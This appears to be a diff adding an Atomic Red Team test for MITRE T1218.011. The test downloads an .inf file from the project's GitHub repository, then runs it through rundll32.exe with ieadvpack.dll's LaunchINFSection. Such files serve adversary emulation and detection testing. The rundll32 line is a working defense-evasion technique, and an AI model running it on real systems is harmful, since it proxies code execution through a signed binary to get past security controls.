@@ -1,0 +1,16 @@
+#TechniqueName: Signed Binary Proxy Execution: Rundll32
+#AtomicTestName: Rundll32 ieadvpack.dll Execution
+#Language: cmd
+
+#get_prereq_commands
+New-Item -Type Directory (split-path PathToAtomicsFolder\T1218.011\src\T1218.011.inf) -ErrorAction ignore | Out-Null
+Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "PathToAtomicsFolder\T1218.011\src\T1218.011.inf"
+
+
+#prereq_commands
+if (Test-Path PathToAtomicsFolder\T1218.011\src\T1218.011.inf) {exit 0} else {exit 1}
+
+
+#commands
+rundll32.exe ieadvpack.dll,LaunchINFSection PathToAtomicsFolder\T1218.011\src\T1218.011.inf,DefaultInstall_SingleUser,1,
+
